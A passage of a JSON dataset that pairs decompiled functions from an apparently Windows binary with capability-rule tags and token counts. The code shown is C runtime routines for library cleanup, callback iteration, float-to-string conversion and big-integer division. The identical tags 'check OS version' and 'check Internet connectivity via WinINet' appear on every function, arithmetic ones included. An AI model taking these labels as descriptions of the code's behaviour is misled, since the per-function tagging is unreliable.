        "decompiled_code": "\nvoid __cdecl fcn.0040e150(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_30h;\n    int32_t *var_2ch;\n    int32_t *var_20h;\n    int32_t *var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040e150::var_30h;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_8h == '\\0') {\n        var_8h = 0x4195c0;\n        var_20h = 0x419610;\n        for (var_14h = 0x4195c0; var_14h != var_20h; var_14h = var_14h + 1) {\n            var_2ch = var_14h;\n            if (*var_14h != 0) {\n                if (*var_14h != -1) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*var_14h);\n                    fcn.004114b0();\n                }\n                *var_2ch = 0;\n            }\n        }\n    }\n    uStack8 = 0x40e1e8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 337
    },
    "0040e1f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e1f0(code **arg_8h, code **arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_d0h;\n    uint var_10h;\n    code **var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040e1f0::var_10h;\n    for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (arg_8h != arg_ch) {\n        for (var_8h = arg_8h; var_8h != arg_ch; var_8h = var_8h + 2) {\n            if (*var_8h != NULL) {\n                (**var_8h)();\n                cVar1 = fcn.004114b0();\n                if (cVar1 == '\\0') break;\n            }\n        }\n        if (var_8h != arg_ch) {\n            for (; var_8h != arg_8h; var_8h = var_8h + -2) {\n                if ((var_8h[-2] != NULL) && (var_8h[-1] != NULL)) {\n                    (*var_8h[-1])(0);\n                    fcn.004114b0();\n                }\n            }\n        }\n    }\n    uStack8 = 0x40e2bf;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 359
    },
    "0040e2d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e2d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040e2d0::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_8h != arg_ch) {\n        for (var_8h = arg_ch; var_8h != arg_8h; var_8h = var_8h + -8) {\n            if (*(var_8h + -4) != 0) {\n                (**(var_8h + -4))(0);\n                fcn.004114b0();\n            }\n        }\n    }\n    uStack8 = 0x40e34f;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 260
    },
    "0040e360": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e360(char *s2, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t var_110h;\n    uint32_t var_10ch;\n    uint var_50h;\n    char *var_44h;\n    char *var_38h;\n    uint32_t var_2ch;\n    uint32_t var_20h;\n    uint32_t var_14h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040e360::var_50h;\n    for (iVar4 = 0x14; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_10ch = s2 != NULL;\n    var_8h = var_10ch;\n    if ((var_10ch == 0) &&\n       (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 1, 0, \n                             0x41322c, L\"buffer != nullptr\"),  iVar4 == 1)) {\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (var_8h == 0) {\n        puVar3 = sub.msvcrt.dll__errno();\n        *puVar3 = 0x16;\n        fcn.00405a50(L\"buffer != nullptr\", L\"__acrt_fp_strflt_to_string\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 1, 0);\n    }\n    else {\n        var_10ch = arg_ch != 0;\n        var_14h = var_10ch;\n        if ((var_10ch == 0) &&\n           (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 2, 0, \n                                 0x41322c, L\"buffer_count > 0\"),  iVar4 == 1)) {\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if (var_14h == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            fcn.00405a50(L\"buffer_count > 0\", L\"__acrt_fp_strflt_to_string\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 2, 0);\n        }\n        else {\n            *s2 = '\\0';\n            if (arg_10h < 1) {\n                var_10ch = 0;\n            }\n            else {\n                var_10ch = arg_10h;\n            }\n            var_110h = var_10ch + 1 < arg_ch;\n            var_20h = var_110h;\n            if ((var_110h == 0) &&\n               (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 5\n                                     , 0, 0x41322c, L\"buffer_count > static_cast<size_t>((digits > 0 ? digits : 0) + 1)\"\n                                    ),  iVar4 == 1)) {\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (var_20h == 0) {\n                puVar3 = sub.msvcrt.dll__errno();\n                *puVar3 = 0x22;\n                fcn.00405a50(L\"buffer_count > static_cast<size_t>((digits > 0 ? digits : 0) + 1)\", \n                             L\"__acrt_fp_strflt_to_string\", \n                             L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 5, 0);\n            }\n            else {\n                var_10ch = arg_14h != 0;\n                var_2ch = var_10ch;\n                if ((var_10ch == 0) &&\n                   (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", \n                                         *0x419030 + 6, 0, 0x41322c, L\"pflt != nullptr\"),  iVar4 == 1)) {\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if (var_2ch == 0) {\n                    puVar3 = sub.msvcrt.dll__errno();\n                    *puVar3 = 0x16;\n                    fcn.00405a50(L\"pflt != nullptr\", L\"__acrt_fp_strflt_to_string\", \n                                 L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\_fptostr.cpp\", *0x419030 + 6, 0);\n                }\n                else {\n                    var_44h = *(arg_14h + 8);\n                    *s2 = '0';\n                    var_38h = s2 + 1;\n                    for (; 0 < arg_10h; arg_10h = arg_10h + -1) {\n                        if (*var_44h == '\\0') {\n                            cVar1 = '0';\n                        }\n                        else {\n                            cVar1 = *var_44h;\n                            var_44h = var_44h + 1;\n                        }\n                        *var_38h = cVar1;\n                        var_38h = var_38h + 1;\n                    }\n                    *var_38h = '\\0';\n                    if ((-1 < arg_10h) && ('4' < *var_44h)) {\n                        while (var_38h = var_38h + -1,  *var_38h == '9') {\n                            *var_38h = '0';\n                        }\n                        *var_38h = *var_38h + '\\x01';\n                    }\n                    if (*s2 == '1') {\n                        *(arg_14h + 4) = *(arg_14h + 4) + 1;\n                    }\n                    else {\n                        iVar4 = sub.msvcrt.dll_strlen(s2 + 1);\n                        sub.msvcrt.dll_memmove(s2, s2 + 1, iVar4 + 1);\n                    }\n                }\n            }\n        }\n    }\n    uStack8 = 0x40e6fd;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1628
    },
    "0040e710": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_15h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.0040e710(uint arg_8h, uint32_t noname_1, char *arg_10h, uint32_t *arg_14h, char *arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    char16_t *pcVar2;\n    char cVar3;\n    uint32_t arg_8h_00;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    bool bVar8;\n    float10 fVar9;\n    uint64_t uVar10;\n    uint var_1594h;\n    char16_t *var_1590h;\n    uint var_1588h;\n    uint var_13b0h;\n    uint var_11d8h;\n    uint var_1000h;\n    uint var_f98h;\n    uint var_e28h;\n    uint var_c50h;\n    uint var_475h;\n    uint32_t var_46ch;\n    uint32_t var_460h;\n    uint var_454h;\n    uint var_448h;\n    char *var_43ch;\n    char *var_430h;\n    int32_t var_424h;\n    char *var_418h;\n    uint var_40ch;\n    uint var_234h;\n    uint32_t var_5ch;\n    int32_t var_50h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_34h;\n    uint uStackY48;\n    uint var_28h;\n    char16_t *var_24h;\n    char16_t *pcStackY36;\n    uint uStackY32;\n    uchar auStack28 [3];\n    char16_t *var_15h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00411820();\n    puVar7 = &fcn.0040e710::var_f98h;\n    for (iVar6 = 0x3e6; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0xcccccccc;\n        puVar7 = puVar7 + 1;\n    }\n    arg_8h_00 = *0x41900c ^ &stack0xfffffffc;\n    if (arg_1ch == 0) {\n        stack0xffffffe8 = 1.932333506454218e-307;\n        _auStack28 = NULL;\n        uStackY32 = 0x59;\n        pcStackY36 = L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\";\n        var_24h = 0x2;\n        var_28h = 0x40e75c;\n        iVar6 = fcn.00405830();\n        if (iVar6 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    stack0xffffffe8 = CONCAT44(0x40e77a, stack0xffffffe8);\n    uVar4 = fcn.004117c0();\n    bVar8 = (uVar4 & 0x7ff) == 0;\n    _auStack28 = _auStack28 & 0xffffff | bVar8 << 0x18;\n    if (bVar8) {\n        var_1590h = NULL;\n    }\n    else {\n        var_1590h = 0x100000;\n    }\n    pcVar2 = var_1590h;\n    var_28h = 0;\n    var_24h = var_1590h;\n    if (bVar8) {\n        var_1590h = 0x2;\n    }\n    else {\n        var_1590h = 0x1;\n    }\n    var_34h = var_1590h;\n    var_44h = arg_8h;\n    var_40h = (noname_1 & 0xfffff) + pcVar2;\n    stack0xffffffe8 = CONCAT44(0x40e844, stack0xffffffe8);\n    uVar4 = fcn.004117c0();\n    var_50h = ((uVar4 & 0x7ff) - 0x434) + var_34h;\n    unique0x10000409 = CONCAT44(noname_1, arg_8h);\n    _auStack28 = 0x40e864;\n    fVar9 = sub.msvcrt.dll_log10();\n    unique0x00003f80 = fVar9;\n    _auStack28 = 0x40e86c;\n    sub.msvcrt.dll_ceil();\n    stack0xffffffe8 = CONCAT44(0x40e874, stack0xffffffe8);\n    var_5ch = fcn.00411850();\n    if ((var_5ch == 0x7fffffff) || (var_5ch == 0x80000000)) {\n        stack0xffffffe8 = 1.932421781479122e-307;\n        _auStack28 = NULL;\n        uStackY32 = 0x7e;\n        pcStackY36 = L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\";\n        var_24h = 0x2;\n        var_28h = 0x40e8a7;\n        iVar6 = fcn.00405830();\n        if (iVar6 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        var_5ch = 0;\n    }\n    stack0xffffffe8 = CONCAT44(var_40h, var_44h);\n    _auStack28 = &fcn.0040e710::var_234h;\n    uStackY32 = 0x40e8cb;\n    fcn.0040fb80(_auStack28, var_44h, var_40h);\n    stack0xffffffe8 = CONCAT44(0x40e8d9, stack0xffffffe8);\n    fcn.0040eda0();\n    if (var_50h < 0) {\n        if (var_50h != -0x3fe) {\n            stack0xffffffe8 = CONCAT44(0x34, &fcn.0040e710::var_11d8h);\n            _auStack28 = 0x40e993;\n            uVar5 = fcn.0040fc70(&fcn.0040e710::var_11d8h, 0x34);\n            stack0xffffffe8 = CONCAT44(uVar5, &fcn.0040e710::var_234h);\n            _auStack28 = 0x40e9a3;\n            cVar3 = fcn.0040ef20(&fcn.0040e710::var_234h, uVar5);\n            if (cVar3 == '\\0') {\n                stack0xffffffe8 = CONCAT44(2, &fcn.0040e710::var_234h);\n                _auStack28 = 0x40e9f2;\n                fcn.00410480(&fcn.0040e710::var_234h, 2);\n                stack0xffffffe8 = CONCAT44(2 - var_50h, &fcn.0040e710::var_1588h);\n                _auStack28 = 0x40ea0a;\n                uVar5 = fcn.0040fc70(&fcn.0040e710::var_1588h, 2 - var_50h);\n                stack0xffffffe8 = CONCAT44(uVar5, 0x40ea19);\n                fcn.0040ed30(uVar5);\n                goto code_r0x0040ea19;\n            }\n        }\n        stack0xffffffe8 = CONCAT44(1, &fcn.0040e710::var_234h);\n        _auStack28 = 0x40e9bb;\n        fcn.00410480(&fcn.0040e710::var_234h, 1);\n        stack0xffffffe8 = CONCAT44(1 - var_50h, &fcn.0040e710::var_13b0h);\n        _auStack28 = 0x40e9d3;\n        uVar5 = fcn.0040fc70(&fcn.0040e710::var_13b0h, 1 - var_50h);\n        stack0xffffffe8 = CONCAT44(uVar5, 0x40e9e2);\n        fcn.0040ed30(uVar5);\n    }\n    else {\n        stack0xffffffe8 = CONCAT44(0x34, &fcn.0040e710::var_c50h);\n        _auStack28 = 0x40e8f1;\n        uVar5 = fcn.0040fc70(&fcn.0040e710::var_c50h, 0x34);\n        stack0xffffffe8 = CONCAT44(uVar5, &fcn.0040e710::var_234h);\n        _auStack28 = 0x40e901;\n        cVar3 = fcn.0040ef20(&fcn.0040e710::var_234h, uVar5);\n        if (cVar3 == '\\0') {\n            stack0xffffffe8 = CONCAT44(var_50h + 2, &fcn.0040e710::var_234h);\n            _auStack28 = 0x40e955;\n            fcn.00410480(&fcn.0040e710::var_234h, var_50h + 2);\n            stack0xffffffe8 = 1.976262583364986e-323;\n            _auStack28 = &fcn.0040e710::var_1000h;\n            uStackY32 = 0x40e968;\n            uVar5 = fcn.0040fb80(_auStack28, 4, 0);\n            stack0xffffffe8 = CONCAT44(uVar5, 0x40e977);\n            fcn.0040ed30(uVar5);\n        }\n        else {\n            stack0xffffffe8 = CONCAT44(var_50h + 1, &fcn.0040e710::var_234h);\n            _auStack28 = 0x40e91e;\n            fcn.00410480(&fcn.0040e710::var_234h, var_50h + 1);\n            stack0xffffffe8 = 9.881312916824931e-324;\n            _auStack28 = &fcn.0040e710::var_e28h;\n            uStackY32 = 0x40e931;\n            uVar5 = fcn.0040fb80(_auStack28, 2, 0);\n            stack0xffffffe8 = CONCAT44(uVar5, 0x40e940);\n            fcn.0040ed30(uVar5);\n        }\n    }\ncode_r0x0040ea19:\n    if (var_5ch < 0) {\n        stack0xffffffe8 = stack0xffffffe8 & 0xffffffff00000000 | -var_5ch;\n        _auStack28 = &fcn.0040e710::var_234h;\n        uStackY32 = 0x40ea46;\n        fcn.00410230(_auStack28, -var_5ch);\n    }\n    else {\n        stack0xffffffe8 = stack0xffffffe8 & 0xffffffff00000000 | var_5ch;\n        _auStack28 = &fcn.0040e710::var_40ch;\n        uStackY32 = 0x40ea2f;\n        fcn.00410230(_auStack28, var_5ch);\n    }\n    var_418h = arg_18h;\n    stack0xffffffe8 = 0xa;\n    _auStack28 = &fcn.0040e710::var_234h;\n    uStackY32 = 0x40ea60;\n    fcn.00410110(_auStack28, 10);\n    unique0x00001e00 = &fcn.0040e710::var_40ch;\n    _auStack28 = &fcn.0040e710::var_234h;\n    uStackY32 = 0x40ea76;\n    var_424h = fcn.0040f170(_auStack28, unique0x00001e00);\n    if (var_424h == 10) {\n        var_5ch = var_5ch + 1;\n        *var_418h = '1';\n        var_418h = var_418h + 1;\n        stack0xffffffe8 = 0xa;\n        _auStack28 = &fcn.0040e710::var_40ch;\n        uStackY32 = 0x40eab7;\n        fcn.00410110(_auStack28, 10);\n    }\n    else if (var_424h == 0) {\n        var_5ch = var_5ch - 1;\n    }\n    else {\n        *var_418h = var_424h + '0';\n        var_418h = var_418h + 1;\n    }\n    *arg_14h = var_5ch;\n    if ((var_5ch < 0) || (0x7fffffff < arg_10h)) {\n        var_1590h = arg_10h;\n    }\n    else {\n        var_1590h = arg_10h + var_5ch;\n    }\n    unique0x1000066a = var_1590h;\n    var_430h = var_1590h;\n    if (arg_1ch + -1 < var_1590h) {\n        var_1590h = arg_1ch + -1;\n    }\n    var_43ch = arg_18h + var_1590h;\n    while (var_418h != var_43ch) {\n        unique0x00001e00 = &fcn.0040e710::var_234h;\n        _auStack28 = 0x40eb80;\n        uVar10 = fcn.0040fb40(unique0x00001e00);\n        *0x8 = uVar10 >> 0x20;\n        if ((uVar10 & 0xff) != 0) break;\n        var_448h = 9;\n        var_454h = 1000000000;\n        stack0xffffffe8 = 0x3b9aca00;\n        _auStack28 = &fcn.0040e710::var_234h;\n        uStackY32 = 0x40ebb4;\n        fcn.00410110(_auStack28, 1000000000);\n        unique0x00001e00 = &fcn.0040e710::var_40ch;\n        _auStack28 = &fcn.0040e710::var_234h;\n        uStackY32 = 0x40ebca;\n        var_460h = fcn.0040f170(_auStack28, unique0x00001e00);\n        if (999999999 < var_460h) {\n            stack0xffffffe8 = L\"quotient < digits_per_iteration_multiplier\";\n            _auStack28 = 0x41322c;\n            uStackY32 = 0;\n            pcStackY36 = 0xee;\n            var_24h = L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\";\n            var_28h = 2;\n            uStackY48 = 0x40ebfc;\n            iVar6 = fcn.00405830();\n            if (iVar6 == 1) {\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        for (var_46ch = 8; var_46ch != 0xffffffff; var_46ch = var_46ch - 1) {\n            var_475h._0_1_ = var_460h % 10 + '0';\n            var_460h = var_460h / 10;\n            if (var_46ch <= var_43ch - var_418h) {\n                var_418h[var_46ch] = var_475h;\n            }\n        }\n        if (var_43ch - var_418h < 10) {\n            var_1590h = var_43ch - var_418h;\n        }\n        else {\n            var_1590h = 0x9;\n        }\n        *0x8 = var_418h + var_1590h;\n        var_418h = *0x8;\n    }\n    *var_418h = '\\0';\n    _auStack28 = var_418h;\n    uStackY32 = 0x40ece0;\n    fcn.00411450();\n    fcn.00405180(arg_8h_00);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 3851
    },
    "0040f170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a24h\n// WARNING: Removing unreachable block (ram,0x0040f7ca)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040f170(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint32_t var_a24h;\n    uint var_a20h;\n    uint var_a1ch;\n    uint32_t var_a18h;\n    uint var_a10h;\n    uint var_838h;\n    uint var_724h;\n    uint var_660h;\n    uint32_t var_188h;\n    uint32_t var_17ch;\n    int32_t var_178h;\n    uint32_t var_16ch;\n    uint32_t var_160h;\n    uint32_t var_154h;\n    uint32_t var_148h;\n    uint32_t var_13ch;\n    int32_t var_138h;\n    uint32_t var_12ch;\n    int32_t var_128h;\n    int32_t var_11ch;\n    int32_t var_118h;\n    uint32_t var_10ch;\n    uint32_t var_100h;\n    uint32_t var_fch;\n    uint32_t var_f0h;\n    int32_t var_e4h;\n    uint var_d8h;\n    uint var_d4h;\n    int32_t var_c8h;\n    int32_t var_bch;\n    uint32_t var_b0h;\n    uint32_t var_a4h;\n    uint32_t var_98h;\n    int32_t var_8ch;\n    int32_t var_80h;\n    uint32_t var_74h;\n    uint32_t var_68h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_3ch;\n    uint32_t var_30h;\n    uint32_t var_24h;\n    uint32_t var_18h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    iVar4 = 0x1c9;\n    puVar5 = &fcn.0040f170::var_724h;\n    while( true ) {\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        *puVar5 = 0xcccccccc;\n        puVar5 = puVar5 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    if (*arg_8h == 0) {\n        _var_5ch = CONCAT44(var_58h, var_5ch);\n        _var_4ch = CONCAT44(var_48h, var_4ch);\n        uVar7 = 0;\n        _var_12ch = CONCAT44(var_128h, var_12ch);\n        _var_d8h = CONCAT44(var_d4h, var_d8h);\n        _var_11ch = CONCAT44(var_118h, var_11ch);\n        _var_13ch = CONCAT44(var_138h, var_13ch);\n    }\n    else if (*arg_ch == 0) {\n        iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\inc\\\\corecrt_internal_big_integer.h\", \n                             *0x419034 + 10, 0, 0x41322c, 0x415b44);\n        if (iVar4 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        _var_5ch = CONCAT44(var_58h, var_5ch);\n        _var_4ch = CONCAT44(var_48h, var_4ch);\n        uVar7 = 0;\n        _var_12ch = CONCAT44(var_128h, var_12ch);\n        _var_d8h = CONCAT44(var_d4h, var_d8h);\n        _var_11ch = CONCAT44(var_118h, var_11ch);\n        _var_13ch = CONCAT44(var_138h, var_13ch);\n    }\n    else {\n        var_ch = *arg_8h - 1;\n        uVar3 = *arg_ch;\n        var_18h = uVar3 - 1;\n        if (var_18h == 0) {\n            var_24h = arg_ch[1];\n            if (var_24h == 1) {\n                var_30h = arg_8h[1];\n                uVar2 = fcn.0040eda0();\n                fcn.0040ed30(uVar2);\n                _var_5ch = CONCAT44(var_58h, var_5ch);\n                _var_4ch = CONCAT44(var_48h, var_4ch);\n                uVar7 = var_30h;\n                _var_12ch = CONCAT44(var_128h, var_12ch);\n                _var_d8h = CONCAT44(var_d4h, var_d8h);\n                _var_11ch = CONCAT44(var_118h, var_11ch);\n                _var_13ch = CONCAT44(var_138h, var_13ch);\n            }\n            else if (var_ch == 0) {\n                var_3ch = arg_8h[1];\n                uVar2 = fcn.0040eda0();\n                fcn.0040ed30(uVar2);\n                arg_8h[1] = var_3ch % var_24h;\n                var_a18h = arg_8h[1] != 0;\n                *arg_8h = var_a18h;\n                _var_5ch = CONCAT44(var_58h, var_5ch);\n                _var_4ch = CONCAT44(var_48h, var_4ch);\n                uVar7 = var_3ch / var_24h;\n                _var_12ch = CONCAT44(var_128h, var_12ch);\n                _var_d8h = CONCAT44(var_d4h, var_d8h);\n                _var_11ch = CONCAT44(var_118h, var_11ch);\n                _var_13ch = CONCAT44(var_138h, var_13ch);\n            }\n            else {\n                _var_4ch = 0;\n                _var_5ch = 0;\n                for (var_68h = var_ch; var_68h != 0xffffffff; var_68h = var_68h - 1) {\n                    uVar6 = fcn.004117a0();\n                    var_58h = uVar6 >> 0x20;\n                    var_5ch = uVar6 | arg_8h[var_68h + 1];\n                    uVar7 = fcn.004117a0();\n                    fcn.004114e0(var_5ch, var_58h, var_24h, 0);\n                    _var_4ch = uVar7;\n                    _var_5ch = fcn.00411550();\n                }\n                uVar2 = fcn.0040eda0();\n                fcn.0040ed30(uVar2);\n                uVar3 = fcn.004117c0();\n                arg_8h[2] = uVar3;\n                arg_8h[1] = var_5ch;\n                if (arg_8h[2] == 0) {\n                    var_a18h = 1;\n                }\n                else {\n                    var_a18h = 2;\n                }\n                *arg_8h = var_a18h;\n                uVar7 = _var_4ch;\n                _var_12ch = CONCAT44(var_128h, var_12ch);\n                _var_d8h = CONCAT44(var_d4h, var_d8h);\n                _var_11ch = CONCAT44(var_118h, var_11ch);\n                _var_13ch = CONCAT44(var_138h, var_13ch);\n            }\n        }\n        else if (var_ch < var_18h) {\n            uVar7 = 0;\n            _var_5ch = CONCAT44(var_58h, var_5ch);\n            _var_4ch = CONCAT44(var_48h, var_4ch);\n            _var_12ch = CONCAT44(var_128h, var_12ch);\n            _var_d8h = CONCAT44(var_d4h, var_d8h);\n            _var_11ch = CONCAT44(var_118h, var_11ch);\n            _var_13ch = CONCAT44(var_138h, var_13ch);\n        }\n        else {\n            var_80h = var_ch - var_18h;\n            for (var_98h = var_ch; var_80h <= var_98h; var_98h = var_98h - 1) {\n                if (arg_ch[(var_98h - var_80h) + 1] != arg_8h[var_98h + 1]) {\n                    var_8ch = var_80h;\n                    if (arg_ch[(var_98h - var_80h) + 1] < arg_8h[var_98h + 1]) {\n                        var_8ch = var_80h + 1;\n                    }\n                    goto code_r0x0040f49e;\n                }\n            }\n            var_8ch = var_80h + 1;\ncode_r0x0040f49e:\n            var_74h = uVar3;\n            if (var_8ch == 0) {\n                uVar7 = 0;\n                _var_5ch = CONCAT44(var_58h, var_5ch);\n                _var_4ch = CONCAT44(var_48h, var_4ch);\n            }\n            else {\n                var_a4h = arg_ch[uVar3];\n                var_b0h = arg_ch[uVar3 - 1];\n                var_bch = fcn.0040f0f0(var_a4h);\n                var_c8h = 0x20 - var_bch;\n                if (var_bch != 0) {\n                    var_a4h = var_a4h << (var_bch & 0x1f) | var_b0h >> (var_c8h & 0x1f);\n                    var_b0h = var_b0h << (var_bch & 0x1f);\n                    if (2 < var_74h) {\n                        var_b0h = arg_ch[var_74h - 2] >> (var_c8h & 0x1f) | var_b0h;\n                    }\n                }\n                _var_d8h = 0;\n                var_e4h = var_8ch;\n                while( true ) {\n                    var_e4h = var_e4h + -1;\n                    uVar3 = var_ch;\n                    if (var_e4h < 0) break;\n                    if (var_ch < var_e4h + var_74h) {\n                        var_a18h = 0;\n                    }\n                    else {\n                        var_a18h = arg_8h[var_e4h + var_74h + 1];\n                    }\n                    var_f0h = var_a18h;\n                    var_100h = arg_8h[var_e4h + var_74h];\n                    var_fch = var_a18h;\n                    var_10ch = arg_8h[var_e4h + var_74h + -1];\n                    if (var_bch != 0) {\n                        uVar6 = fcn.004117a0();\n                        var_fch = uVar6 >> 0x20;\n                        var_100h = uVar6 | var_10ch >> (var_c8h & 0x1f);\n                        var_10ch = var_10ch << (var_bch & 0x1f);\n                        if (2 < var_e4h + var_74h) {\n                            var_10ch = arg_8h[var_e4h + var_74h + -2] >> (var_c8h & 0x1f) | var_10ch;\n                        }\n                    }\n                    iVar8 = fcn.004114e0(var_100h, var_fch, var_a4h, 0);\n                    _var_11ch = iVar8;\n                    uVar3 = fcn.00411550(var_100h, var_fch, var_a4h, 0);\n                    var_128h = 0;\n                    _var_12ch = uVar3;\n                    if (var_118h != 0) {\n                        var_12ch = uVar3;\n                        iVar8 = fcn.004117e0(var_a4h, 0, var_11ch + 1, var_118h - (var_11ch != -1));\n                        _var_12ch = iVar8 + CONCAT44(var_128h, var_12ch);\n                        _var_11ch = 0xffffffff;\n                    }\n                    for (; var_128h = _var_12ch >> 0x20,  var_128h == 0; _var_12ch = _var_12ch - 0xa8) {\n                        uVar7 = fcn.004117e0();\n                        uVar9 = fcn.004117a0();\n                        var_a24h = uVar9 | var_10ch;\n                        if (uVar7 <= (uVar9 & 0xffffffff00000000 | var_a24h)) break;\n                        _var_11ch = CONCAT44(var_118h - (var_11ch == 0), var_11ch + -1);\n                    }\n                    if (_var_11ch != 0) {\n                        _var_13ch = 0;\n                        var_148h = 0;\n                        while( true ) {\n                            var_118h = _var_11ch >> 0x20;\n                            var_138h = _var_13ch >> 0x20;\n                            if 